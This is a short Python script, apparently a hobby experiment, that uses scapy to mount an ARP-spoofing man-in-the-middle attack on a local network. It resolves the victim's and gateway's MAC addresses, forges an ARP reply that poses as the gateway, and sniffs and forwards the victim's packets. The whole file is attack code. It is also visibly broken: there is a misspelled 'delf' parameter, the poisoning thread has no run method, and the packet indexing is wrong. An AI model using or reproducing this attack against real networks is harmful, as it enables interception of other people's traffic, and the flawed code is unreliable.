#/bin/python
# Program for messing w/ arp spoofing in python w/ scapy

import threading
import time
import sys

from scapy.all import *
from scapy import *

VICTIM_IP = '192.168.1.2' #man in the middle victim
VICTIM_MAC = ''

GATEWAY_IP = '192.168.1.1' #other side of the man in the middle
GATEWAY_MAC = ''

ATTACKER_IP = '192.168.1.3'
ATTACKER_MAC = ''

class ArpPoisonThread(threading.Thread):
  def __init__(delf, arp_response):
    threading.Thread.__init__(self)
    self.arp_response = arp_response
    self.cont = True
	
  def finish(self):
    self.cont = False
	

def forward_packet(packet):
  if IP in packet and packet[IP.src] == VICTIM_IP:
    packet.show()
    packet[Ether].dst = GATEWAY_MAC
    packet.show()
    send(packet)
	
def main():
  global VICTIM_IP, VICTIM_MAC
  global ATTACKER_IP, ATTACKER_MAC
  global GATEWAY_IP, GATEWAY_MAC
  
  # Get the gateway MAC address
  answr, unanswr = sr(ARP(hwdst=ETHER_BROADCAST, pdst=GATEWAY_IP))
  arp_response = answr[0][1]
  GATEWAY_MAC = arp_response.hwsrc
  print GATEWAY_IP, GATEWAY_MAC
  
  # Create broadcast ARP request
  arp_request = ARP(hwdst=ETHER_BROADCAST, pdst=VICTIM_IP)
  
  # Get attacker IP address and MAC
  ATTACKER_IP = arp_request.psrc
  ATTACKER_MAC = arp_request.hwsrc
  print ATTACKER_IP, ATTACKER_MAC
  
  # Get Victim MAC address
  answr, unanswr = sr(arp_request)
  arp_response = answr[0][1]
  VICTIM_MAC = arp_response.hwsrc
  print VICTIM_IP, VICTIM_MAC
  
  # Generate ARP Poision Response
  arp_response.psrc = GATEWAY_IP
  arp_response.hwsrc = ATTACKER_MAC
  arp_response.pdst = VICTIM_IP
  arp_response.hwdst = VICTIM_MAC
  
  arp_posion = ArpPoisonThread(arp_response)
  arp_posion.start()
  
  try:
    sniff(prn=forward_packet, count=10000)
  except (KeyboardInterrupt, SystemExit):
    arp_posion.finish()
    sys.exit()
    raise
  
